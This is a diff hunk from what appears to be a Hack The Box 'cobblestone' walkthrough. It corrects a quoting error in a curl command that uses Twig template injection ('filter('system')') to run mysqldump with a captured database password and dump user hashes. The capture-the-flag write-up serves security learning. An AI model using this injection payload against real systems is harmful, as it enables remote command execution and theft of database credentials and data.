@@ -388,7 +388,7 @@ And found one under `/etc/apparmor.d/apache2.d/cobblestone`. I listed the conten
 So I decided to use the `mysqldump` binary to access the cobblestone database using the RCE and dump its data. We can use the credentials obtained earlier from `connection.php` file.
 
 ```
-curl -s -b 'PHPSESSID=bacmalfaljv6nbinidoi1urb93' -X POST 'http://cobblestone.htb/preview_banner.php' -d "first={{[mysqldump -u dbuser -p\"aichooDeeYanaekungei9rogi0eMuo2o\" cobblestone > /tmp/cobbledump.sql']|filter('system')}}"
+curl -s -b 'PHPSESSID=bacmalfaljv6nbinidoi1urb93' -X POST 'http://cobblestone.htb/preview_banner.php' -d "first={{['mysqldump -u dbuser -p\"aichooDeeYanaekungei9rogi0eMuo2o\" cobblestone > /tmp/cobbledump.sql']|filter('system')}}"
 ```
 
 After dumping the database in a file I then used cat to see the dump which revealed the user hashes from the database
